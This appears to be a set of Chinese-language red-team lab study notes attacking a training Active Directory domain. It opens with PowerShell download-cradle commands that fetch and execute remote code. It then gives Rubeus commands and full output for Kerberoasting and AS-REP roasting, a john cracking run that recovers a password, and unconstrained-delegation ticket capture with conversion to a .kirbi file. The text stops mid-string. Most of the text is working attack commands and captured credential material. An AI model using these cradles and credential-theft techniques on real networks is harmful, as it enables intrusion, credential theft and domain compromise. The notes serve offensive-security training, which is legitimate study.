powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"

powershell.exe -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"

# Kerberoasting

枚举域中所有SPN

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660177644996.png)


```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /simple /nowrap
[+] host called home, sent: 585311 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : dev.cyberbotic.io
[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[+] received output:

[*] Total kerberoastable users : 2


[+] received output:
$krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433@dev.cyberbotic.io*$7795F2A1A18820C454802E5F59CAE5B9$066D8750AA3E8112A731C65CD2DE54263AF799C742F9F98BBF09B127D49ED99D858F45B1BADE67D98BF147A8B993AA467D0D1766CDD8B3AA82F71DD9B2A922B957F8F13A86705E772123B9D582E8C3CEA16FF17339D307790B50C32B74291D80D098A55C65CFDDC71747878DEEEABFDCF43523F82909E47C6B6E39039D8517BEBC7FBBC09EA39621DC2CD85A5DA7E4DE1215C92FECBF469D25E5718EEFE99D59C95BF048BB9FD72DD6A003F471CABA24EE645246F0EC55F60E3BD5A012392F77479765BB4D4DD21CDB581AED9002F82E61FD8ABCBD7426AB4C3331424642378EBDCF47ACB9FCD67235801C4AB61DCA4C033BD5AB9181C069BF1A8369894630E404474D767AABA01634B1D05F2C6AC5B7B8ECCFA43A91B445A663C0E6922E12F0A5097FD099A10244C5A0C7CE1C12391494E8D5F6333B6F6B67FE70C825019A1AB3082DD3E5DAF1FA3B1AF2EB68F227D34FB2123F1439487E6C8D13C17C552E4D441DABF9C38330786AD8325A483C2FE3F8FC2525CE47D108483C6881F2E2B94C6907429B0519671720B1189EDB9FC6E5862D72EC8DF4E3B2FE105B46D8C3D9F6A912D0E84F3632C86DD6A92B002CB66877EC4BE49A6C66507AA435CB85085A8CA87B1FFF0CF68371C0F546F5EC5D149399DF4BADB32ED6AD39361039433E01A204D4EBF292DEC2E1A0A56872CD87EFF4CB251F629420A6766D1296B9AC96E7C6BEBB8DDC9C6A25D7EA58A20929B8DCAA05E4F1B3159AF40316816062FAE89BCA1BB35E67B3193F95C234ED833A0B210370BABA8AF168F9C8639A23547D7D4D4B771DA017C3D4A55C54DE3C6F78A776040C09987C5274F70B7C6C59A6F77B3BF886130FE8EE756B110722C0B8670B51AC63F3C8CED91A3C8D746C0D6E250D1A654FBB0DAD5DDA1BD91F49C01E56D9310BE2EF393375268F5C6A5FF784933DBEEAAE5706C4271E0263CB70043CC455E6E228722713F22B1EEF00F85AD1087120A73CEEB0A56027B9CD449D789C1DDDB16922078F555EBCAA7EBBF00BFD1AE10BDA159A5A1BB5F7545A5527C8E26B9BFB958E7269358F74F54E8FE3A6812FE1E14F8D27E4696ED6ACBD435C191D038F53BB3B19469E8B10A65F0A94F636E2F126977EFFE6C1BB3E530ADB26C18EA5B01178A68D389DD356423D58EF0A341F0FC8881508EE804DAA098CB48063D0E3EA40D4F5014912E97346F3D1953480A2454FEC1B5AAA639E96A740401F76ABC4F6897BC811B161A93D338C75EEE084BC0295B5553D833C7AD261105FC54857FC397D6256020B1A22EB05749C238E9D82873B561ABBBEDAC405CBD4692B87D5763BF5228C0A6467579C5CBD61E876C08215C23DB66FAC5DED425722816AAEC29CE272C840DA1694851AF0B7F983D97E078DFE2D702CAABCE164786FC6399CF54AFD5FCE476379FE68253F746D94475647E83E222D79873C539AC8AC981C78A18AA4B4CBAB0121DF93EE0008640E96116B166F6CB6EE2CE088142275D78A91400B5DB0E32A2E529AFBE55ACAD0CD495963CDE933179D0BD1EE1B2A2D03724D799A3676366DBC3A7B943EF359AC67CE8DABC0CA86ACA600AE386D0A6D74DB1D28B7416D484EF96C67C35E61761043FC5B447BCBA543FFD3844296E7D2
$krb5tgs$23$*svc_honey$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io@dev.cyberbotic.io*$20928CE9F86A3DEDC4BDB3174F2796EE$3267EF9F928009FA766A03C47E6726D37E84842EE296606CEB171580516AE455BBF56DDDEC218AD80BA1835304728EA2E49B39604357AF047FE2E8676DE383BDA28EB6E9AC06208F6CF1D836243641E984EED18B9EA9E727057F9AEBABC66A776D2D7B457C9B42E356B1C8E019AF3FBFAF616BB9E0F97ECF3342AE64AF9EDB36CEAAA54939C1C1AF477B40E1B9CDD10698E54B3F30045C09E7AE0320D8510C67FB5D933833DE974919C6EE84919E65C41033B8665B08646506BBEDA0FE221DAD71DAA877693BDC33A0C9445C5727DCE532B74767BD186B363A85BA856808DE63BDF3BA2C4FE8F43802DDD40610C0E1D739217FBE9F7B7C768AA11DC01DE9C8B87F7583D504FE5D1696D3CB4106782E0F208373245D5C63F2C151C70DD062E4098DB4A802F40FD008245AC97E79146569E36D4A0E3C3DC9F8A35D29E6551E3A074A57C9E6111B6FDED72CBF93D4C684E78A34B9ED4004EE0653AD093B648E9B4807A12C7B137E178C95152B8FFEB1CB3A87157242A236963F2129AC4D3F885F2F6DB3DB8AA120358E9088878C28016E04722FDFE303979E1AD9C9FCA5B399181A7BA70E370043D0286BE5C0326143C2FD9C090B3A8CB212CA15A352885D9BD6DE0E52CBE4BC81D55837F79D0CD043CD342912C98F5D27A4A4F6A2B7CB2B9541A19F19BF735A76E35154960C28257888AB9A40F15788394E2DC390102EF47EEDB23ADF520321480B2686BDF98E73A83DD0C531E850BD12F9C73E2FAFEA0518678EFE47D2B8E1A51CFDD848DB3A0006802F58BE2EEBB44177469C0C48278090E3A6B69EAF8E552248663DE48F3C9211B9E3EEDCAF86075ECE3DCA7C7BA1D73F311FAE488311082BE76C546538B4DFC0F877184A52A36448CFC45E1866ECEADEDA2AEB921BC0AFDD7C6C93E00FCAF9FDFBA008FAB0747D385D6328D76A67FAD4B5581E693301D6197E6CB6BC2DB84283CBBACF6F0B852732CB46B6069F54622ACB3B141AD058723A8DFB38303561E72C6C560A910804B1E76DA84E03BD8D13F3FF50D646936D897371257B1692D0D3BBF2D4B4C20D9A6D8D19983C0D7DCEB3E36D34F4AB75A9AEB4844D419F61DEBCFC4035BCFDA8518DACE7717E735ECF2DFE5F2FB35BD5D42890EDD050EC8C0F0767F652D6FEE11350DC8910B9174306026AC88C8DAD5FA2659B344578AFB82E5E0223203048C521D80434BE5677A49F0F2799CAB1E9D98A343F01D804F042A36BA49F6352C826DFB0B81CAEB83CBE4B505FDFD127D059010A3D68062BCF2E4B3D2FB2300E780CD1E78D5CB566D7B507C39CE1190E871CFCC786A46133BC401D6A56E913604F4100DAF29711370211D06C125B0C3C48BEB1884612D5B9DA8C486EEC1C578E7C290E8AB99DAC2A8A703DBD43E7674DA9DA4B0D68507DC08E8A3FC7C3B3FB50EE6246E4A66237DB854D0683D4515AF53DAE7BACF262780AE8B2630063D235AC1EBB3F5FB08738E9C6CD35FC86A43D00DDC025E593EDCB1BB4DB5E25F0B53BC3DEB028DB9C14BB6FC02E0F497D072CFD3BF152CFD295771DDBB8F1F753FF56FFD21A72E7D58B197C9C647CDC49167B05DE0F459A9428AC1E631D559CC606BF8F6C6B30F518E5CD66A42C46DC411ABE81C59E06CF3D88BB
```

特定用户的spn，这里选择svc_mysql

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660177751965.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:svc_mssql /nowrap
[+] host called home, sent: 585327 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: Kerberoasting


[+] received output:
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_mssql
[*] Target Domain          : dev.cyberbotic.io
[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_mssql)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[+] received output:

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
[*] PwdLastSet             : 5/14/2021 1:28:34 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433@dev.cyberbotic.io*$7795F2A1A18820C454802E5F59CAE5B9$066D8750AA3E8112A731C65CD2DE54263AF799C742F9F98BBF09B127D49ED99D858F45B1BADE67D98BF147A8B993AA467D0D1766CDD8B3AA82F71DD9B2A922B957F8F13A86705E772123B9D582E8C3CEA16FF17339D307790B50C32B74291D80D098A55C65CFDDC71747878DEEEABFDCF43523F82909E47C6B6E39039D8517BEBC7FBBC09EA39621DC2CD85A5DA7E4DE1215C92FECBF469D25E5718EEFE99D59C95BF048BB9FD72DD6A003F471CABA24EE645246F0EC55F60E3BD5A012392F77479765BB4D4DD21CDB581AED9002F82E61FD8ABCBD7426AB4C3331424642378EBDCF47ACB9FCD67235801C4AB61DCA4C033BD5AB9181C069BF1A8369894630E404474D767AABA01634B1D05F2C6AC5B7B8ECCFA43A91B445A663C0E6922E12F0A5097FD099A10244C5A0C7CE1C12391494E8D5F6333B6F6B67FE70C825019A1AB3082DD3E5DAF1FA3B1AF2EB68F227D34FB2123F1439487E6C8D13C17C552E4D441DABF9C38330786AD8325A483C2FE3F8FC2525CE47D108483C6881F2E2B94C6907429B0519671720B1189EDB9FC6E5862D72EC8DF4E3B2FE105B46D8C3D9F6A912D0E84F3632C86DD6A92B002CB66877EC4BE49A6C66507AA435CB85085A8CA87B1FFF0CF68371C0F546F5EC5D149399DF4BADB32ED6AD39361039433E01A204D4EBF292DEC2E1A0A56872CD87EFF4CB251F629420A6766D1296B9AC96E7C6BEBB8DDC9C6A25D7EA58A20929B8DCAA05E4F1B3159AF40316816062FAE89BCA1BB35E67B3193F95C234ED833A0B210370BABA8AF168F9C8639A23547D7D4D4B771DA017C3D4A55C54DE3C6F78A776040C09987C5274F70B7C6C59A6F77B3BF886130FE8EE756B110722C0B8670B51AC63F3C8CED91A3C8D746C0D6E250D1A654FBB0DAD5DDA1BD91F49C01E56D9310BE2EF393375268F5C6A5FF784933DBEEAAE5706C4271E0263CB70043CC455E6E228722713F22B1EEF00F85AD1087120A73CEEB0A56027B9CD449D789C1DDDB16922078F555EBCAA7EBBF00BFD1AE10BDA159A5A1BB5F7545A5527C8E26B9BFB958E7269358F74F54E8FE3A6812FE1E14F8D27E4696ED6ACBD435C191D038F53BB3B19469E8B10A65F0A94F636E2F126977EFFE6C1BB3E530ADB26C18EA5B01178A68D389DD356423D58EF0A341F0FC8881508EE804DAA098CB48063D0E3EA40D4F5014912E97346F3D1953480A2454FEC1B5AAA639E96A740401F76ABC4F6897BC811B161A93D338C75EEE084BC0295B5553D833C7AD261105FC54857FC397D6256020B1A22EB05749C238E9D82873B561ABBBEDAC405CBD4692B87D5763BF5228C0A6467579C5CBD61E876C08215C23DB66FAC5DED425722816AAEC29CE272C840DA1694851AF0B7F983D97E078DFE2D702CAABCE164786FC6399CF54AFD5FCE476379FE68253F746D94475647E83E222D79873C539AC8AC981C78A18AA4B4CBAB0121DF93EE0008640E96116B166F6CB6EE2CE088142275D78A91400B5DB0E32A2E529AFBE55ACAD0CD495963CDE933179D0BD1EE1B2A2D03724D799A3676366DBC3A7B943EF359AC67CE8DABC0CA86ACA600AE386D0A6D74DB1D28B7416D484EF96C67C35E61761043FC5B447BCBA543FFD3844296E7D2


```

上面格式转成
```
$krb5tgs$23$*svc_mssql$dev.cyberbotic.io*$7795F2A1A18820C454802E5F59CAE5B9$066D8750AA3E8112A731C65CD2DE54263AF799C742F9F98BBF09B127D49ED99D858F45B1BADE67D98BF147A8B993AA467D0D1766CDD8B3AA82F71DD9B2A922B957F8F13A86705E772123B9D582E8C3CEA16FF17339D307790B50C32B74291D80D098A55C65CFDDC71747878DEEEABFDCF43523F82909E47C6B6E39039D8517BEBC7FBBC09EA39621DC2CD85A5DA7E4DE1215C92FECBF469D25E5718EEFE99D59C95BF048BB9FD72DD6A003F471CABA24EE645246F0EC55F60E3BD5A012392F77479765BB4D4DD21CDB581AED9002F82E61FD8ABCBD7426AB4C3331424642378EBDCF47ACB9FCD67235801C4AB61DCA4C033BD5AB9181C069BF1A8369894630E404474D767AABA01634B1D05F2C6AC5B7B8ECCFA43A91B445A663C0E6922E12F0A5097FD099A10244C5A0C7CE1C12391494E8D5F6333B6F6B67FE70C825019A1AB3082DD3E5DAF1FA3B1AF2EB68F227D34FB2123F1439487E6C8D13C17C552E4D441DABF9C38330786AD8325A483C2FE3F8FC2525CE47D108483C6881F2E2B94C6907429B0519671720B1189EDB9FC6E5862D72EC8DF4E3B2FE105B46D8C3D9F6A912D0E84F3632C86DD6A92B002CB66877EC4BE49A6C66507AA435CB85085A8CA87B1FFF0CF68371C0F546F5EC5D149399DF4BADB32ED6AD39361039433E01A204D4EBF292DEC2E1A0A56872CD87EFF4CB251F629420A6766D1296B9AC96E7C6BEBB8DDC9C6A25D7EA58A20929B8DCAA05E4F1B3159AF40316816062FAE89BCA1BB35E67B3193F95C234ED833A0B210370BABA8AF168F9C8639A23547D7D4D4B771DA017C3D4A55C54DE3C6F78A776040C09987C5274F70B7C6C59A6F77B3BF886130FE8EE756B110722C0B8670B51AC63F3C8CED91A3C8D746C0D6E250D1A654FBB0DAD5DDA1BD91F49C01E56D9310BE2EF393375268F5C6A5FF784933DBEEAAE5706C4271E0263CB70043CC455E6E228722713F22B1EEF00F85AD1087120A73CEEB0A56027B9CD449D789C1DDDB16922078F555EBCAA7EBBF00BFD1AE10BDA159A5A1BB5F7545A5527C8E26B9BFB958E7269358F74F54E8FE3A6812FE1E14F8D27E4696ED6ACBD435C191D038F53BB3B19469E8B10A65F0A94F636E2F126977EFFE6C1BB3E530ADB26C18EA5B01178A68D389DD356423D58EF0A341F0FC8881508EE804DAA098CB48063D0E3EA40D4F5014912E97346F3D1953480A2454FEC1B5AAA639E96A740401F76ABC4F6897BC811B161A93D338C75EEE084BC0295B5553D833C7AD261105FC54857FC397D6256020B1A22EB05749C238E9D82873B561ABBBEDAC405CBD4692B87D5763BF5228C0A6467579C5CBD61E876C08215C23DB66FAC5DED425722816AAEC29CE272C840DA1694851AF0B7F983D97E078DFE2D702CAABCE164786FC6399CF54AFD5FCE476379FE68253F746D94475647E83E222D79873C539AC8AC981C78A18AA4B4CBAB0121DF93EE0008640E96116B166F6CB6EE2CE088142275D78A91400B5DB0E32A2E529AFBE55ACAD0CD495963CDE933179D0BD1EE1B2A2D03724D799A3676366DBC3A7B943EF359AC67CE8DABC0CA86ACA600AE386D0A6D74DB1D28B7416D484EF96C67C35E61761043FC5B447BCBA543FFD3844296E7D2
```



# AS-REP Roasting

枚举关闭了kerberos预认证的用户

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178346391.jpg)

枚举上面用户的哈希

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178409310.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asreproast /user:svc_oracle /nowrap
[+] host called home, sent: 585329 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: AS-REP roasting

[*] Target User            : svc_oracle
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=svc_oracle))'
[*] SamAccountName         : svc_oracle
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\svc_oracle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$svc_oracle@dev.cyberbotic.io:5125359739A99E22EC26ADD5B60287CE$1ECD74195BC35CAC5224A3BD84879CED340BBF22E7309F02E7DC9EA7BCFC4FDD4419E511BFAFB3FC8FC397605B0CA193CB0D235FE3407A99D4E5DB2ECD08CA7A51CB63EFAAC700776A1B89BEF6A2DFAD6E6CC1A83C4C3EF8BB87EC5CB26BDE1C1792D0F96BCE8BF18258386379B8C475995255F32384FEC81B09C75F09F2504B7C04D8C5FF28DFEEC28D397BF15B9A6D91348012B37918CBCC20CC4B04C273D4F0D63BC21CF6ACDC4AD24C40B016325A760BDF1483614567F5EED768B745B1C9145A87CEDF374F8B38B6D704F61B84990BB0A51F1CF4EF6F8AFE652760A1FB943247710B6B740A8132920EAA42A94828F86434A3BBFB


```

整理成一行
```
$krb5asrep$svc_oracle@dev.cyberbotic.io:5125359739A99E22EC26ADD5B60287CE$1ECD74195BC35CAC5224A3BD84879CED340BBF22E7309F02E7DC9EA7BCFC4FDD4419E511BFAFB3FC8FC397605B0CA193CB0D235FE3407A99D4E5DB2ECD08CA7A51CB63EFAAC700776A1B89BEF6A2DFAD6E6CC1A83C4C3EF8BB87EC5CB26BDE1C1792D0F96BCE8BF18258386379B8C475995255F32384FEC81B09C75F09F2504B7C04D8C5FF28DFEEC28D397BF15B9A6D91348012B37918CBCC20CC4B04C273D4F0D63BC21CF6ACDC4AD24C40B016325A760BDF1483614567F5EED768B745B1C9145A87CEDF374F8B38B6D704F61B84990BB0A51F1CF4EF6F8AFE652760A1FB943247710B6B740A8132920EAA42A94828F86434A3BBFB
```

用john破解
```
┌──(root💀kali)-[~/crto]
└─# john  svc_oracle --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd!        ($krb5asrep$svc_oracle@dev.cyberbotic.io)     
1g 0:00:00:00 DONE (2022-08-11 00:00) 2.127g/s 598059p/s 598059c/s 598059C/s SANANDREAS..March30
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```


# 无约束委派

枚举无约束委派的机器

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178578300.png)


DC默认是无约束委派的机器，重点关注SRV-1$

1. 假设已经攻破SRV-1$这台机器，在SRV-1$上开启监听：

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179325582.png)


2. 来到WKSTN-2，以nlamb的身份执行```dir \\srv-1\c$```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179399723.png)

3. 收到nlamb的票据哈希


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179478426.png)


```
[+] received output:

[*] 8/13/2022 12:05:37 AM UTC - Found new TGT:

  User                  :  nlamb@DEV.CYBERBOTIC.IO
  StartTime             :  8/13/2022 12:05:35 AM
  EndTime               :  8/13/2022 10:05:35 AM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsG
    a3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP46cUuZcjwVYCnrsfz/+ND3pPTeURup/ID
    /eK56bLSGFYat3pt8llgbkjI+JTE5bG2EPi+1+vhNZSluxWKsdmehHvvyecOLwCpiLAtS7jj0wntk/SMgOjhgps6fNmbxAdtnjo9
    WxWHSIYONIblOrEqzLky9dFVFO9zlxlKZt+paK9YElEtb+Gtb+coplTWxV0fM9Uh8REFDQlKpPv7kdYEA+BhyTnsDq2a92VgJ2BH
    Snq+Nqu5iUBuVrRva25P5mcEbOqZhc44+GnHigkgk9VulSi4JV5tYgUapj5nmYv2cJyYqxY6PoL/2JOMozK+qNXIpClB2w7JaJts
    qnshN7kcRm3pGq5UVu2BLSvM0OywYzw4neU55j5jK8dtfRGb44gTEWmdlktD7NpWcEzrCHHBDl7yUSWp9eUgzlUjHzAIAlLN16FV
    tdHJs81KOCt8cGIWvG4GzjQiZ8Bw/hMqPxDd+ccdeIuPooydEyJNZ6A8afmuHObDif/c/mHZ9zaQOpH8y2w56wRsIWHB+71B96wR
    dH3w/2SttBd3if8YdhDIV+a2JeJwu58lkdxrPllRD5fCx8nssaFD1+f160Iui7RN8sDK3bfL4IucOzZHkvC024NNNu139K7ShexL
    felaQO6n8NT2y/vtjQEFpjdvXXypo+Q5R3cb5xA+PIu5VFtU5AWe2ZQrde7TYwhDlV+e5e4wqIL7s+HFZFBrOWh+NHFLqPmwbx/8
    TQytnZAhcPZLp6HdhNh5plP+o9HZapOXd6x5jexQI7BxqGo0m/lU0vuAHqoKcyJHV4MGPUTuY3Byw+37yYnLaR4W6jvvzRl+jMie
    lLE3I852D3SFXOGuAJRdf+ZhrrVrY6Eeb8bKfImsLp9CvbxGEsAvs9K5kcWIWJ3sPC880o7DZlVJP6jIkOSVIWrnKUaxB+7PvVbc
    GoNkVsi23MHCUPPArF3Im9jxWagODSQHmhzYiKkghHJIHZUX4KymnmnEjebClwcQvtol570LS/cvGqtEStvCQLH30kXI+bXtiBPx
    ZUTYRnztDyMwBTUqhSELZbrvGA/SViJrOMZO24vUc7VpMwArVRDlubq1VBNuZNpSCuHXoQ9Dz0X65lCETjpyKSxGPh4cPiwY/xDl
    jqEZnG6COOSj6iSHAR1w8eDw1ziMUYGIf0uNHsJBhHRiZYaL8FbL/0rPvVKWPSuJk69smoSMn22bLNf05aP15RbyGiC3nymUCHRX
    hT3b+APKxsFHl8h/DbVlEvPWFmI6hGIO7I3/4VJkXUkI+0VebmRk9BfVF/T+U1lHr9iy0DGjocsAzOhL23Y8JCV839tNmM6DFTY5
    jGu5lOOwl5J/fiE4yFGcp7CjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCDp028cyVAizDtOxteL
    I/smZyuj14wvAn5HtIjziiQwh6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIw
    MjIwODEzMDAwNTM1WqYRGA8yMDIyMDgxMzEwMDUzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYw
    JKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw==

[*] Ticket cache size: 1




```

doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP46cUuZcjwVYCnrsfz/+ND3pPTeURup/ID/eK56bLSGFYat3pt8llgbkjI+JTE5bG2EPi+1+vhNZSluxWKsdmehHvvyecOLwCpiLAtS7jj0wntk/SMgOjhgps6fNmbxAdtnjo9WxWHSIYONIblOrEqzLky9dFVFO9zlxlKZt+paK9YElEtb+Gtb+coplTWxV0fM9Uh8REFDQlKpPv7kdYEA+BhyTnsDq2a92VgJ2BHSnq+Nqu5iUBuVrRva25P5mcEbOqZhc44+GnHigkgk9VulSi4JV5tYgUapj5nmYv2cJyYqxY6PoL/2JOMozK+qNXIpClB2w7JaJtsqnshN7kcRm3pGq5UVu2BLSvM0OywYzw4neU55j5jK8dtfRGb44gTEWmdlktD7NpWcEzrCHHBDl7yUSWp9eUgzlUjHzAIAlLN16FVtdHJs81KOCt8cGIWvG4GzjQiZ8Bw/hMqPxDd+ccdeIuPooydEyJNZ6A8afmuHObDif/c/mHZ9zaQOpH8y2w56wRsIWHB+71B96wRdH3w/2SttBd3if8YdhDIV+a2JeJwu58lkdxrPllRD5fCx8nssaFD1+f160Iui7RN8sDK3bfL4IucOzZHkvC024NNNu139K7ShexLfelaQO6n8NT2y/vtjQEFpjdvXXypo+Q5R3cb5xA+PIu5VFtU5AWe2ZQrde7TYwhDlV+e5e4wqIL7s+HFZFBrOWh+NHFLqPmwbx/8TQytnZAhcPZLp6HdhNh5plP+o9HZapOXd6x5jexQI7BxqGo0m/lU0vuAHqoKcyJHV4MGPUTuY3Byw+37yYnLaR4W6jvvzRl+jMielLE3I852D3SFXOGuAJRdf+ZhrrVrY6Eeb8bKfImsLp9CvbxGEsAvs9K5kcWIWJ3sPC880o7DZlVJP6jIkOSVIWrnKUaxB+7PvVbcGoNkVsi23MHCUPPArF3Im9jxWagODSQHmhzYiKkghHJIHZUX4KymnmnEjebClwcQvtol570LS/cvGqtEStvCQLH30kXI+bXtiBPxZUTYRnztDyMwBTUqhSELZbrvGA/SViJrOMZO24vUc7VpMwArVRDlubq1VBNuZNpSCuHXoQ9Dz0X65lCETjpyKSxGPh4cPiwY/xDljqEZnG6COOSj6iSHAR1w8eDw1ziMUYGIf0uNHsJBhHRiZYaL8FbL/0rPvVKWPSuJk69smoSMn22bLNf05aP15RbyGiC3nymUCHRXhT3b+APKxsFHl8h/DbVlEvPWFmI6hGIO7I3/4VJkXUkI+0VebmRk9BfVF/T+U1lHr9iy0DGjocsAzOhL23Y8JCV839tNmM6DFTY5jGu5lOOwl5J/fiE4yFGcp7CjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCDp028cyVAizDtOxteLI/smZyuj14wvAn5HtIjziiQwh6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODEzMDAwNTM1WqYRGA8yMDIyMDgxMzEwMDUzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw==


用powershell根据tgt制作ticket
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nlamb.kirbi", [Convert]::FromBase64String("doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP46cUuZcjwVYCnrsfz/+ND3pPTeURup/ID/eK56bLSGFYat3pt8llgbkjI+JTE5bG2EPi+1+vhNZSluxWKsdmehHvvyecOLwCpiLAtS7jj0wntk/SMgOjhgps6fNmbxAdtnjo9WxWHSIYONIblOrEqzLky9dFVFO9zlxlKZt+paK9YElEtb+Gtb+coplTWxV0fM9Uh8REFDQlKpPv7kdYEA+BhyTnsDq2a92VgJ2BHSnq+Nqu5iUBuVrRva25P5mcEbOqZhc44+GnHigkgk9VulSi4JV5tYgUapj5nmYv2cJyYqxY6PoL/2JOMozK+qNXIpClB2w7JaJtsqnshN7kcRm3pGq5UVu2BLSvM0OywYzw4neU55j5jK8dtfRGb44gTEWmdlktD7NpWcEzrCHHBDl7yUSWp9eUgzlUjHzAIAlLN16FVtdHJs81KOCt8cGIWvG4GzjQiZ8Bw/hMqPxDd+ccdeIuPooydEyJNZ6A8afmuHObDif/c/mHZ9zaQOpH8y2w56wRsIWHB+71B96wRdH3w/2SttBd3if8YdhDIV+a2JeJwu58lkdxrPllRD5fCx8nssaFD1+f160Iui7RN8sDK3b